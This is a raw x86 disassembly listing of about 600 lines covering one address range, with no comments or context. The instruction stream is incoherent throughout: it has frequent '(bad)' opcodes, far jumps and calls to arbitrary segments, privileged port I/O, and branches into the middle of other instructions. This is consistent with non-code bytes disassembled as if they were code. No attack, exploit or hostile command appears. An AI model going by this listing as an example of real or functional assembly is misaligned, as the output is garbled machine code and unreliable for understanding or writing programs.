  429fad:	mov    ebx,0xfbabbf2d
  429fb2:	dec    edi
  429fb3:	mov    cl,0x21
  429fb5:	and    BYTE PTR [esi+eax*4],ch
  429fb8:	cmc    
  429fb9:	test   al,0x6c
  429fbb:	outs   dx,BYTE PTR ds:[esi]
  429fbc:	stc    
  429fbd:	andps  xmm3,XMMWORD PTR [esi]
  429fc0:	call   0xf522:0xb9ff93b1
  429fc7:	popa   
  429fc8:	pop    ebp
  429fc9:	stos   DWORD PTR es:[edi],eax
  429fca:	cmp    al,0x2e
  429fcc:	lods   eax,DWORD PTR ds:[esi]
  429fcd:	mov    bl,BYTE PTR [ecx-0x33]
  429fd0:	pop    eax
  429fd1:	sar    ebx,cl
  429fd3:	lds    esp,FWORD PTR [ebx+eax*4-0x5]
  429fd7:	mov    cl,0xfa
  429fd9:	sbb    DWORD PTR [edi+0x2d],esi
  429fdc:	mov    ah,0x73
  429fde:	fimul  DWORD PTR [ecx-0x35686c05]
  429fe4:	xchg   DWORD PTR [ebp-0x5d],edx
  429fe7:	inc    ecx
  429fe8:	lea    eax,[edi-0x32]
  429feb:	aas    
  429fec:	aas    
  429fed:	adc    DWORD PTR [ecx+0x8],ebp
  429ff0:	jns    0x429fe8
  429ff2:	cmp    ecx,DWORD PTR [ebx-0x40d648a9]
  429ff8:	scas   al,BYTE PTR es:[edi]
  429ff9:	inc    eax
  429ffa:	jmp    0x4f2d:0xa25bf990
  42a001:	stos   DWORD PTR es:[edi],eax
  42a002:	and    BYTE PTR [ebx+0x24],dh
  42a005:	push   ebx
  42a006:	inc    ebx
  42a007:	das    
  42a008:	pop    esp
  42a009:	xchg   esp,eax
  42a00a:	addr16 mov ds:0x4df9,eax
  42a00e:	aaa    
  42a00f:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a011:	adc    eax,0x5058ad78
  42a017:	ror    DWORD PTR [ecx],1
  42a019:	mov    al,ds:0x9e4cd33c
  42a01e:	mov    al,0xb7
  42a020:	(bad)  
  42a024:	mov    eax,DWORD PTR [eax]
  42a026:	jno    0x429ff7
  42a028:	add    DWORD PTR [ebx+0x337ec1ac],eax
  42a02e:	pop    edi
  42a02f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a030:	jp     0x429ffa
  42a032:	es mov ebx,0x15c86b40
  42a038:	test   BYTE PTR [edx+edx*8-0x2b],bh
  42a03c:	jne    0x42a09b
  42a03e:	mov    ch,BYTE PTR [ecx+0x25]
  42a041:	inc    eax
  42a042:	sbb    eax,0x945331e
  42a047:	arpl   WORD PTR [esi+0x3409de41],si
  42a04d:	aas    
  42a04e:	fimul  WORD PTR [eax]
  42a050:	push   ss
  42a051:	cld    
  42a052:	and    eax,ecx
  42a054:	dec    ebx
  42a055:	pop    ds
  42a056:	cmc    
  42a057:	in     eax,0x4a
  42a059:	xchg   edi,eax
  42a05a:	sbb    BYTE PTR [eax+0x15],0xe5
  42a05e:	push   eax
  42a05f:	add    eax,0x6bd7d81f
  42a064:	fcmovu st,st(6)
  42a066:	test   eax,0x81bcc065
  42a06b:	cwde   
  42a06c:	imul   ebp,DWORD PTR [ebx],0xee71ed96
  42a072:	xchg   edi,eax
  42a073:	fdivr  DWORD PTR [ebx-0x4986993b]
  42a079:	(bad)  
  42a07a:	mov    ds:0x95c15f04,eax
  42a07f:	sub    BYTE PTR [edi],ch
  42a081:	push   edx
  42a082:	int3   
  42a083:	in     eax,0x1e
  42a085:	pop    ebp
  42a086:	add    eax,0x8cbb11e8
  42a08b:	xchg   ecx,eax
  42a08c:	or     ebp,esi
  42a08e:	fdivr  st(2),st
  42a090:	cmp    al,BYTE PTR [esi+0x2d]
  42a093:	mov    WORD PTR [ebp+0x61],ss
  42a096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a097:	inc    eax
  42a098:	xchg   ebx,eax
  42a099:	test   eax,0x503011c1
  42a09e:	mov    cl,0x41
  42a0a0:	hlt    
  42a0a1:	inc    esi
  42a0a2:	mov    ss,WORD PTR [edi-0x15]
  42a0a5:	xchg   BYTE PTR [eax],bh
  42a0a7:	xor    DWORD PTR [ebx+0x37da82d4],ecx
  42a0ad:	dec    eax
  42a0ae:	adc    ah,BYTE PTR [eax-0x37d7cf8f]
  42a0b4:	xchg   ebp,eax
  42a0b5:	pusha  
  42a0b6:	das    
  42a0b7:	scas   eax,DWORD PTR es:[edi]
  42a0b8:	add    edi,DWORD PTR [eax]
  42a0ba:	imul   ebp,edi,0x854d1ab1
  42a0c0:	pop    esp
  42a0c1:	mov    edi,ebp
  42a0c3:	cld    
  42a0c4:	jo     0x42a0af
  42a0c6:	mov    ds:0xbf71cbe7,al
  42a0cb:	xor    DWORD PTR [esi-0x6f],esi
  42a0ce:	sbb    BYTE PTR [eax-0x24d83e70],ah
  42a0d4:	sbb    ebp,DWORD PTR [edi]
  42a0d6:	loopne 0x42a0db
  42a0d8:	jl     0x42a0bc
  42a0da:	mov    ds:0x6abaa482,eax
  42a0df:	dec    ebp
  42a0e0:	in     eax,dx
  42a0e1:	mov    ecx,0x444a8589
  42a0e6:	push   ds
  42a0e7:	xchg   ecx,eax
  42a0e8:	int    0xe
  42a0ea:	xchg   ebx,eax
  42a0eb:	sub    BYTE PTR [ecx+0x7a],0x99
  42a0ef:	mov    dh,0x1b
  42a0f1:	jecxz  0x42a155
  42a0f3:	mov    eax,0xd69bf39b
  42a0f8:	fldenv [esi+ebx*4]
  42a0fb:	mov    al,0x82
  42a0fd:	leave  
  42a0fe:	gs push 0x74c2672e
  42a104:	aam    0xca
  42a106:	(bad)  
  42a107:	data16 sbb cl,0xc2
  42a10b:	xchg   ebx,eax
  42a10c:	dec    edx
  42a10d:	sar    BYTE PTR [esi],0xb0
  42a110:	cmp    bh,bh
  42a112:	adc    al,0x69
  42a114:	jne    0x42a14a
  42a116:	call   0x564b91d0
  42a11b:	mov    BYTE PTR [edx],0xfd
  42a11e:	xor    edi,esp
  42a120:	shr    BYTE PTR [edx-0x453512e9],1
  42a126:	cmp    ecx,DWORD PTR [ebp+0x3110ee52]
  42a12c:	and    al,0x1f
  42a12e:	lods   eax,DWORD PTR ds:[esi]
  42a12f:	call   0xa855:0x62918c63
  42a136:	iret   
  42a137:	aaa    
  42a138:	or     al,0x72
  42a13a:	and    ebp,esp
  42a13c:	cwde   
  42a13d:	mov    cl,0xfc
  42a13f:	fcmovu st,st(7)
  42a141:	ins    BYTE PTR es:[edi],dx
  42a142:	(bad)  
  42a143:	popa   
  42a144:	les    edx,FWORD PTR [edx+ecx*4]
  42a147:	fadd   QWORD PTR [ecx]
  42a149:	adc    DWORD PTR [ebp+0x41a1c6f1],0x5a0d246f
  42a153:	adc    DWORD PTR [esi-0x55d89a6],0xd8c93738
  42a15d:	sbb    eax,0xcfd6316a
  42a162:	(bad)
  42a166:	in     al,dx
  42a167:	inc    ecx
  42a168:	jg     0x42a1dc
  42a16a:	xor    BYTE PTR [esi+0x5],cl
  42a16d:	dec    edx
  42a16e:	dec    esi
  42a16f:	(bad)  
  42a170:	pusha  
  42a171:	or     al,0xae
  42a173:	sbb    ah,BYTE PTR [eax]
  42a175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a176:	push   es
  42a177:	icebp  
  42a178:	aad    0x5f
  42a17a:	jne    0x42a1c3
  42a17c:	js     0x42a186
  42a17e:	outs   dx,DWORD PTR ds:[esi]
  42a17f:	aaa    
  42a180:	je     0x42a138
  42a182:	mov    ebp,0xbe392645
  42a187:	mov    ds:0x7eda3e86,al
  42a18c:	shr    DWORD PTR [esi-0x75],1
  42a18f:	xchg   edx,eax
  42a190:	dec    esp
  42a191:	sub    eax,0x8cbaf143
  42a196:	jae    0x42a18e
  42a198:	in     eax,dx
  42a199:	shl    DWORD PTR [edi+ebp*1],cl
  42a19c:	js     0x42a167
  42a19e:	test   DWORD PTR [ecx+eiz*4-0xbd5f559],edx
  42a1a5:	jne    0x42a146
  42a1a7:	mov    al,0x11
  42a1a9:	dec    ebx
  42a1aa:	xor    al,0xb9
  42a1ac:	or     eax,0x7ba3d6e2
  42a1b1:	shr    DWORD PTR [edi],1
  42a1b3:	mov    WORD PTR [edi+0x9ba53e8],ds
  42a1b9:	mov    cl,0x6e
  42a1bb:	rcr    DWORD PTR [ecx],cl
  42a1bd:	pop    ss
  42a1be:	retf   
  42a1bf:	fstp   TBYTE PTR [ecx]
  42a1c1:	dec    edx
  42a1c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a1c3:	clc    
  42a1c4:	out    dx,al
  42a1c5:	mov    BYTE PTR es:[edx],dh
  42a1c8:	push   edx
  42a1c9:	stos   BYTE PTR es:[edi],al
  42a1ca:	push   ss
  42a1cb:	cld    
  42a1cc:	jns    0x42a154
  42a1ce:	shl    DWORD PTR [eax+0x3d],0x83
  42a1d2:	sbb    al,0xcf
  42a1d4:	pop    ebx
  42a1d5:	sub    esp,DWORD PTR [ebx+edx*8-0x50]
  42a1d9:	mov    esi,0xb060bf1a
  42a1de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a1df:	pop    esp
  42a1e0:	xchg   ebp,eax
  42a1e1:	sbb    al,0xa1
  42a1e3:	mov    eax,ds:0x75b76c2c
  42a1e8:	and    DWORD PTR [eax],esp
  42a1ea:	iret   
  42a1eb:	test   DWORD PTR [ecx-0x11293ba],0xc0b0b455
  42a1f5:	hlt    
  42a1f6:	or     ah,BYTE PTR [edi+ecx*1+0x605f87f8]
  42a1fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a1fe:	xor    cl,BYTE PTR [edx+0x69]
  42a201:	(bad)  
  42a202:	mov    ebp,0x8765f442
  42a207:	and    al,0xf
  42a209:	ins    BYTE PTR es:[edi],dx
  42a20a:	jp     0x42a195
  42a20c:	ds stc 
  42a20e:	cmp    BYTE PTR [ebx+0x7a198e2f],0x51
  42a215:	xchg   esp,ebx
  42a217:	aad    0x44
  42a219:	call   FWORD PTR [edx+0x7e166575]
  42a21f:	cmp    BYTE PTR [eax+ebx*2],0x23
  42a223:	inc    edi
  42a224:	jbe    0x42a214
  42a226:	hlt    
  42a227:	in     eax,0x9c
  42a229:	outs   dx,BYTE PTR ds:[esi]
  42a22a:	dec    ebp
  42a22b:	add    ecx,esp
  42a22d:	ret    
  42a22e:	sub    eax,0xc794ce9
  42a233:	xor    al,BYTE PTR [edx-0x2f]
  42a236:	ins    DWORD PTR es:[edi],dx
  42a237:	jno    0x42a1df
  42a239:	mov    ebp,DWORD PTR [eax]
  42a23b:	(bad)  
  42a23c:	push   ds
  42a23d:	sbb    esp,0xffffffc8
  42a240:	inc    esi
  42a241:	int3   
  42a242:	inc    eax
  42a243:	je     0x42a282
  42a245:	xor    BYTE PTR [esi+0x53949034],dl
  42a24b:	int3   
  42a24c:	xchg   esi,eax
  42a24d:	fldenv [eax+0x6c7b8848]
  42a253:	mov    al,BYTE PTR [ecx-0x7b]
  42a256:	data16 ds loop 0x42a2d0
  42a25a:	out    0xe5,eax
  42a25c:	idiv   DWORD PTR [ebx+0x6846fb04]
  42a262:	ds jl  0x42a1fa
  42a265:	adc    DWORD PTR [edx+0x71],eax
  42a268:	inc    esp
  42a269:	fisubr DWORD PTR [esi-0x17]
  42a26c:	mov    ah,0x3c
  42a26e:	lds    ebp,FWORD PTR [eax+edx*1-0x6e]
  42a272:	pop    es
  42a273:	jmp    0x42a26d
  42a275:	mov    ch,0x67
  42a277:	lds    edx,FWORD PTR ds:0x9d24a027
  42a27d:	push   ebx
  42a27e:	cmp    DWORD PTR [esi],esi
  42a280:	pop    ebx
  42a281:	jnp    0x42a29c
  42a283:	fstp   DWORD PTR [ecx+0x7]
  42a286:	mov    ds:0xc88b3811,eax
  42a28b:	retf   
  42a28c:	inc    ecx
  42a28d:	cwde   
  42a28e:	addr16 push edi
  42a290:	add    esp,DWORD PTR [eax-0x444592cd]
  42a296:	retf   
  42a297:	aas    
  42a298:	sar    edi,0x5b
  42a29b:	add    al,0x67
  42a29d:	mov    ch,0xbd
  42a29f:	aam    0x3a
  42a2a1:	add    ah,BYTE PTR [edi+edi*1+0x10]
  42a2a5:	jno    0x42a233
  42a2a7:	out    0xb0,eax
  42a2a9:	shl    BYTE PTR [esi],1
  42a2ab:	or     edi,eax
  42a2ad:	pop    es
  42a2ae:	pop    edx
  42a2af:	sbb    eax,0xec930764
  42a2b4:	ss aad 0x7e
  42a2b7:	stc    
  42a2b8:	js     0x42a23b
  42a2ba:	sbb    eax,DWORD PTR [edi+edx*4+0x41]
  42a2be:	mov    al,0x54
  42a2c0:	mov    eax,ds:0xfea2b1dd
  42a2c5:	jns    0x42a2de
  42a2c7:	jle    0x42a255
  42a2c9:	icebp  
  42a2ca:	sahf   
  42a2cb:	stos   BYTE PTR es:[edi],al
  42a2cc:	pop    ds
  42a2cd:	push   0x2ad31e68
  42a2d2:	add    al,0x97
  42a2d4:	jmp    0x5a06873c
  42a2d9:	cmp    edi,ecx
  42a2db:	imul   eax,DWORD PTR [ebx],0x73682d8c
  42a2e1:	lea    ebx,[eax-0x2c]
  42a2e4:	mov    bl,0x35
  42a2e6:	test   esp,edx
  42a2e8:	shl    DWORD PTR [edx+0x67],0xac
  42a2ec:	sub    BYTE PTR [edi+ebp*4],bh
  42a2ef:	adc    al,0xeb
  42a2f1:	pop    ss
  42a2f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a2f3:	fxch   st(7)
  42a2f5:	adc    dl,BYTE PTR [edi+0x46]
  42a2f8:	inc    edi
  42a2f9:	loopne 0x42a2a0
  42a2fb:	add    eax,DWORD PTR [ebx]
  42a2fd:	sbb    bh,al
  42a2ff:	xchg   edx,eax
  42a300:	cld    
  42a301:	jne    0x42a2c4
  42a303:	sub    al,0x5a
  42a305:	leave  
  42a306:	or     BYTE PTR [eax+0x3657049b],al
  42a30c:	xor    eax,0x49a5f29f
  42a311:	sahf   
  42a312:	int    0xce
  42a314:	cmp    cl,bl
  42a316:	cmp    BYTE PTR [edx+0x4f28cbc4],cl
  42a31c:	adc    eax,DWORD PTR [ecx-0xc48de69]
  42a322:	call   0xbe81:0x17bb6753
  42a329:	dec    esi
  42a32a:	pusha  
  42a32b:	fdivr  st(7),st
  42a32d:	cwde   
  42a32e:	adc    eax,0x81dc217e
  42a333:	xchg   ebp,eax
  42a334:	add    al,0x8c
  42a336:	dec    ebp
  42a337:	rcr    DWORD PTR [esi-0x3fd8a35d],cl
  42a33d:	mov    cl,0x45
  42a33f:	mov    dl,0x0
  42a341:	adc    DWORD PTR [esi+ebx*4],esi
  42a344:	fwait
  42a345:	dec    ecx
  42a346:	mov    esi,0x4246722
  42a34b:	dec    eax
  42a34c:	jo     0x42a3c4
  42a34e:	repnz out dx,al
  42a350:	jg     0x42a37e
  42a352:	dec    DWORD PTR [ecx+0x75]
  42a355:	and    al,0xbd
  42a357:	repnz (bad) 
  42a359:	mov    ebp,0x26f37dc1
  42a35e:	fist   DWORD PTR [ebx-0x63]
  42a361:	retf   0xab2b
  42a364:	jl     0x42a37b
  42a366:	inc    edx
  42a367:	push   esi
  42a368:	push   ds
  42a369:	sbb    eax,0x2b13f99f
  42a36e:	das    
  42a36f:	fistp  DWORD PTR [ecx-0x2c]
  42a372:	pop    esi
  42a373:	pop    ecx
  42a374:	pop    eax
  42a375:	sub    BYTE PTR [ebx-0x1],ah
  42a378:	sub    esp,DWORD PTR [ebp+0x71]
  42a37b:	sub    eax,0xca3d9991
  42a380:	js     0x42a3e3
  42a382:	fist   WORD PTR [eax+0x5a57780e]
  42a388:	ret    0x2751
  42a38b:	in     al,0xc
  42a38d:	fsub   st(2),st
  42a38f:	ins    BYTE PTR es:[edi],dx
  42a390:	ficom  DWORD PTR [eax+0x173e04e4]
  42a396:	jo     0x42a32c
  42a398:	aaa    
  42a399:	jo     0x42a31e
  42a39b:	fadd   DWORD PTR [edx]
  42a39d:	jecxz  0x42a3b0
  42a39f:	cmp    cl,BYTE PTR [ebx-0x66]
  42a3a2:	or     BYTE PTR [ecx],0xbb
  42a3a5:	pop    esp
  42a3a6:	ret    0xe9f7
  42a3a9:	sub    BYTE PTR [ecx-0x54f93f8c],dh
  42a3af:	pop    ecx
  42a3b0:	pop    ecx
  42a3b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a3b2:	neg    BYTE PTR [esi+0x16]
  42a3b5:	in     al,dx
  42a3b6:	inc    esi
  42a3b7:	mov    ds:0x44eaf8c2,eax
  42a3bc:	js     0x42a402
  42a3be:	sub    ebp,DWORD PTR [eax-0x7c]
  42a3c1:	iret   
  42a3c2:	(bad)  [ebx-0x12]
  42a3c5:	mov    BYTE PTR [edx*2+0x7387241a],dl
  42a3cc:	je     0x42a417
  42a3ce:	lods   eax,DWORD PTR ds:[esi]
  42a3cf:	hlt    
  42a3d0:	fcomp  st(3)
  42a3d2:	aas    
  42a3d3:	nop
  42a3d4:	jne    0x42a394
  42a3d6:	add    BYTE PTR [ecx+0x66],al
  42a3d9:	or     eax,0xcf84579e
  42a3de:	fisubr DWORD PTR [edx-0x17]
  42a3e1:	xor    al,0xb
  42a3e3:	out    dx,al
  42a3e4:	das    
  42a3e5:	adc    BYTE PTR [ecx],ch
  42a3e7:	xor    ecx,0x79
  42a3ea:	pop    eax
  42a3eb:	mov    DWORD PTR [edx],edx
  42a3ed:	sar    BYTE PTR [eax+esi*1],cl
  42a3f0:	dec    edx
  42a3f1:	bound  ebp,QWORD PTR [ebp-0x4f45f9d3]
  42a3f7:	adc    al,0xf8
  42a3f9:	cli    
  42a3fa:	xchg   ebx,eax
  42a3fb:	or     BYTE PTR [ecx-0x4c],ah
  42a3fe:	inc    esi
  42a3ff:	in     al,0x47
  42a401:	mov    al,ds:0x2d4b5eac
  42a406:	retf   0xa197
  42a409:	jmp    0xbce91fe8
  42a40e:	mov    edi,0x4ee8be52
  42a413:	imul   ah
  42a415:	es aas 
  42a417:	adc    al,0x17
  42a419:	cmp    BYTE PTR [ebx],dl
  42a41b:	dec    eax
  42a41c:	jmp    0xbe3a:0x86550f2e
  42a423:	sub    BYTE PTR [eax-0x746ef4c3],0x90
  42a42a:	out    dx,eax
  42a42b:	cmp    ch,cl
  42a42d:	stos   BYTE PTR es:[edi],al
  42a42e:	ret    
  42a42f:	arpl   bx,dx
  42a431:	inc    edi
  42a432:	adc    esi,DWORD PTR [edx-0x58]
  42a435:	out    dx,eax
  42a436:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a438:	add    BYTE PTR [edx+0x5ca50ade],0xf5
  42a43f:	aas    
  42a440:	(bad)  [esi]
  42a442:	push   eax
  42a443:	cmp    BYTE PTR [edx],cl
  42a445:	mov    eax,0xe854f2d6
  42a44a:	pop    esp
  42a44b:	sbb    eax,0x43f6ee01
  42a450:	dec    ecx
  42a451:	into   
  42a452:	jge    0x42a450
  42a454:	in     al,dx
  42a455:	outs   dx,DWORD PTR ds:[esi]
  42a456:	mov    edx,0x6ab79e4a
  42a45c:	cwde   
  42a45d:	fxch   st(3)
  42a45f:	cs pop edi
  42a462:	inc    esi
  42a463:	cdq    
  42a464:	in     eax,0x52
  42a466:	loop   0x42a458
  42a468:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a469:	ja     0x42a4b0
  42a46b:	int3   
  42a46c:	sub    eax,0xcf1b85ca
  42a471:	inc    esi
  42a472:	inc    esi
  42a473:	cld    
  42a474:	mov    dh,0xb
  42a476:	fld    DWORD PTR [edx+0x6c5256cd]
  42a47c:	imul   esi,DWORD PTR [edi+0x45],0x644627af
  42a483:	stos   DWORD PTR es:[edi],eax
  42a484:	mov    ds:0xb98bc3aa,eax
  42a489:	lods   al,BYTE PTR ds:[esi]
  42a48a:	or     cl,dh
  42a48c:	ror    cl,0xc7
  42a48f:	mov    edx,0x6beb3e28
  42a494:	xchg   ebp,eax
  42a495:	cmp    eax,0xa79ddbe2
  42a49a:	pop    esi
  42a49b:	sbb    al,bl
  42a49d:	adc    ebp,edx
  42a49f:	in     al,0x9e
  42a4a1:	loop   0x42a502
  42a4a3:	popa   
  42a4a4:	(bad)  
  42a4a5:	xlat   BYTE PTR ds:[ebx]
  42a4a6:	jl     0x42a4a7
  42a4a8:	sbb    al,0xcd
  42a4aa:	lock inc ebx
  42a4ac:	jp     0x42a48c
  42a4ae:	shl    BYTE PTR [ecx+0x5b5aaef3],0x1f
  42a4b5:	cmp    DWORD PTR [edx],0xea6cec02
  42a4bb:	stos   DWORD PTR es:[edi],eax
  42a4bc:	mov    bl,0xc3
  42a4be:	imul   ebp,DWORD PTR [edi-0x8],0x882dc80a
  42a4c5:	mov    BYTE PTR [edx+ebp*4+0x1a31af5c],dl
  42a4cc:	pop    edi
  42a4cd:	je     0x42a521
  42a4cf:	pop    ebx
  42a4d0:	sbb    BYTE PTR [edi],dh
  42a4d2:	pusha  
  42a4d3:	pusha  
  42a4d4:	or     ch,BYTE PTR [edx]
  42a4d6:	mov    bl,0xd3
  42a4d8:	daa    
  42a4d9:	adc    al,0xcb
  42a4db:	mov    ds,WORD PTR [eax+0x3a220eec]
  42a4e1:	ja     0x42a4d8
  42a4e3:	lods   al,BYTE PTR ds:[esi]
  42a4e4:	mov    bh,0x9f
  42a4e6:	dec    ebp
  42a4e7:	mov    ebx,0xbc50cb3a
  42a4ec:	mov    edi,0x6e6e02cb
  42a4f1:	push   eax
  42a4f2:	xor    al,0x71
  42a4f4:	mov    esi,DWORD PTR [ebx]
  42a4f6:	xchg   ebp,eax
  42a4f7:	imul   edx,esp,0x9ba5bd14
  42a4fd:	xor    bl,BYTE PTR [edi-0x36]
  42a500:	(bad)  
  42a501:	or     edi,DWORD PTR ds:0x910f3c7
  42a507:	jae    0x42a552
  42a509:	jmp    0x42a55b
  42a50b:	hlt    
  42a50c:	cmp    DWORD PTR [ecx+0x2f284c09],ebx
  42a512:	cmp    al,0x24
  42a514:	ds sub cl,0x2d
  42a518:	into   
  42a519:	fnstenv [eax+0x44]
  42a51c:	sbb    ch,ch
  42a51e:	rcr    DWORD PTR [ebx],0xe
  42a521:	(bad)  
  42a522:	leave  
  42a523:	ins    BYTE PTR es:[edi],dx
  42a524:	inc    edi
  42a525:	cli    
  42a526:	ins    BYTE PTR es:[edi],dx
  42a527:	sbb    al,0xd6
  42a529:	or     al,BYTE PTR [ecx+0x25]
  42a52c:	mov    esi,es
  42a52e:	mov    DWORD PTR [esi],0x20464b32
  42a534:	pop    ebp
  42a535:	dec    ecx
  42a536:	push   esi
  42a537:	sub    al,0x5f
  42a539:	aaa    
  42a53a:	mov    bh,0xa7
  42a53c:	or     BYTE PTR [ebp+0x66],ah
  42a53f:	fdiv   QWORD PTR [eax-0x4]
  42a542:	jp     0x42a57a
  42a544:	inc    esp
  42a545:	bound  edx,QWORD PTR [edx]
  42a547:	cmp    esp,edx
  42a549:	std    
  42a54a:	xor    dh,BYTE PTR [ebx+eax*8]
  42a54d:	iret   
  42a54e:	push   ss
  42a54f:	aas    
  42a550:	mov    ecx,0xaec28272
  42a555:	(bad)  
  42a556:	pop    edx
  42a557:	or     eax,0x1dcea328
  42a55c:	add    BYTE PTR ds:[ebx],bl
  42a55f:	add    edi,DWORD PTR [ecx-0x48]
  42a562:	fmul   DWORD PTR [edx-0x2d0be90e]
  42a568:	fwait
  42a569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a56a:	test   esi,esp
  42a56c:	jmp    0x3b226074
  42a571:	inc    esi
  42a572:	and    ecx,DWORD PTR [esi+0x5cb6b41e]
  42a578:	sbb    eax,0x26c8846e
  42a57d:	cld    
  42a57e:	aad    0x4
  42a580:	cmp    eax,0xcecd14db
  42a585:	or     ebp,DWORD PTR [eax-0x27922b87]
  42a58b:	mov    ebx,0xeafb1d74
  42a590:	mov    edi,0x22484699
  42a595:	xor    ecx,ecx
  42a597:	shr    DWORD PTR [edx+0x4b],0xdb
  42a59b:	inc    eax
  42a59c:	jbe    0x42a5d0
  42a59e:	xor    BYTE PTR [esi],bh
  42a5a0:	add    DWORD PTR [ecx+edi*2+0x456d9f21],0xac19f280
  42a5ab:	(bad)  
  42a5ac:	(bad)  
  42a5ad:	cmp    eax,0xcff5a70a
  42a5b2:	pop    edx
  42a5b3:	sbb    esp,DWORD PTR [eax-0x93f5e57]
  42a5b9:	stc    
  42a5ba:	mov    edx,0x1d42145
  42a5bf:	jbe    0x42a5e6
  42a5c1:	aad    0xdb
  42a5c3:	aad    0xaa
  42a5c5:	xor    DWORD PTR [ebx],esi
  42a5c7:	jp     0x42a5a1
  42a5c9:	sub    ebx,ebx
  42a5cb:	shl    BYTE PTR [edi+0x4d],0xc
  42a5cf:	mov    ch,0x12
  42a5d1:	dec    esi
  42a5d2:	mov    ds:0x664bc321,al
  42a5d7:	push   esp
  42a5d8:	loopne 0x42a5bc
  42a5da:	inc    edi
  42a5db:	out    0xed,al
  42a5dd:	adc    BYTE PTR [ebp+0x36],bl
  42a5e0:	xchg   esi,eax
  42a5e1:	mov    eax,ds:0xf503398e
  42a5e6:	and    ah,BYTE PTR [ebp-0x623ad21c]
  42a5ec:	xchg   ebp,eax
  42a5ed:	or     cl,bl
  42a5ef:	push   ss
  42a5f0:	fadd   DWORD PTR [edi+0x57]
  42a5f3:	gs int 0x30
  42a5f6:	jae    0x42a64e
  42a5f8:	lock outs dx,DWORD PTR ds:[esi]
  42a5fa:	fwait
  42a5fb:	adc    al,0x7
  42a5fd:	and    al,dl
  42a5ff:	cmp    ecx,DWORD PTR [esi+0x67]
  42a602:	mov    dh,dl
  42a604:	cmp    DWORD PTR [ebx+0x4aae84e6],ebx
  42a60a:	pop    ebx
  42a60b:	mul    DWORD PTR [edi-0x22]
  42a60e:	push   edi
  42a60f:	pop    edi
  42a610:	outs   dx,BYTE PTR ds:[esi]
  42a611:	mov    DWORD PTR gs:[edx-0x5aceab64],eax
  42a618:	popa   
  42a619:	fwait
  42a61a:	jge    0x42a5d5
  42a61c:	pop    esi
  42a61d:	fwait
  42a61e:	js     0x42a685
  42a620:	mov    ebx,0x97a88e2c
  42a625:	(bad)
  42a629:	or     al,0xad
  42a62b:	in     eax,0x5
  42a62d:	(bad)  
  42a62e:	(bad)  
  42a62f:	mov    esp,0xeebf1486
  42a634:	cmp    ah,ah
  42a636:	mov    esp,0x5ee8bc07
  42a63b:	sbb    eax,0x43722e10
  42a640:	or     DWORD PTR [esi+0x50],ebp
  42a643:	sub    eax,0xaabef9f5
  42a648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a649:	imul   eax,DWORD PTR [ebp-0x17],0x41
  42a64d:	xchg   ecx,eax
  42a64e:	cdq    
  42a64f:	loop   0x42a689
  42a651:	ficom  WORD PTR [esi+0x32cb2ed9]
  42a657:	fsub   QWORD PTR [eax]
  42a659:	les    edi,FWORD PTR [ecx-0x6ce4451d]
  42a65f:	xchg   ebx,eax
  42a660:	fldenv [ecx+0x15]
  42a663:	es cs jo 0x42a673
  42a667:	dec    eax
  42a668:	div    cl
  42a66a:	pusha  
  42a66b:	jae    0x42a60c
  42a66d:	push   ebp
  42a66e:	adc    DWORD PTR [ebx+0x659b1c0b],ebx
  42a674:	adc    bl,BYTE PTR [esi-0x4aaa274c]
  42a67a:	es xchg ecx,eax
  42a67c:	pop    ss
  42a67d:	or     al,0xb4
  42a67f:	ja     0x42a6a6
  42a681:	inc    ebp
  42a682:	pusha  
  42a683:	push   ss
  42a684:	and    DWORD PTR [ebx-0x2a318801],edi
  42a68a:	dec    ebp
  42a68b:	and    DWORD PTR [ebp+0x3a2635f4],0x64
  42a692:	xchg   DWORD PTR [ebx],edx
  42a694:	sbb    al,0xd6
  42a696:	and    eax,0x4103d2c5
  42a69b:	out    0x61,eax
  42a69d:	xchg   eax,edi
  42a69f:	(bad)  
  42a6a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a6a1:	sbb    BYTE PTR [ecx],ch
  42a6a3:	add    bl,al
  42a6a5:	mov    edi,gs
  42a6a7:	mov    edx,0x1cfd804d
  42a6ac:	jbe    0x42a69f
  42a6ae:	xor    cl,BYTE PTR [ebx+0x410e81a6]
  42a6b4:	ror    DWORD PTR [ebx-0x7f3cbe07],0x47
  42a6bb:	adc    DWORD PTR [ecx+0x4e],ebx
  42a6be:	jbe    0x42a71a
  42a6c0:	or     dh,dl
  42a6c2:	inc    edx
  42a6c3:	into   
  42a6c4:	rcl    DWORD PTR [ecx+0x20],cl
  42a6c7:	lock das 
  42a6c9:	shl    BYTE PTR [edi-0x6a],0xc4
  42a6cd:	cmp    edi,edi
  42a6cf:	mov    ebx,ebp
  42a6d1:	push   edi
  42a6d2:	or     DWORD PTR [edx+0x5],edx
  42a6d5:	shl    esi,0x73
  42a6d8:	or     eax,0x423d5e65
  42a6dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a6de:	mov    edi,0xb4716db2
  42a6e3:	call   0xbc5e055e
  42a6e8:	stos   BYTE PTR es:[edi],al
  42a6e9:	xchg   edi,eax
  42a6ea:	fs scas eax,DWORD PTR es:[edi]
  42a6ec:	mov    al,ds:0xa5d33b99
  42a6f1:	fld    QWORD PTR [esi+0x6c37c2dc]
  42a6f7:	inc    ebp
  42a6f8:	ja     0x42a730
  42a6fa:	popf   
  42a6fb:	sbb    esp,DWORD PTR [edi+0x33bf7127]
  42a701:	daa    
  42a702:	arpl   WORD PTR [esi+0x26],cx
  42a705:	jae    0x42a75b
  42a707:	push   cs
  42a708:	fdivr  DWORD PTR [esi]
  42a70a:	cwde   
  42a70b:	push   ds
  42a70c:	mov    dh,0xfa
  42a70e:	xor    cl,ch
  42a710:	and    eax,0xc32ec27c
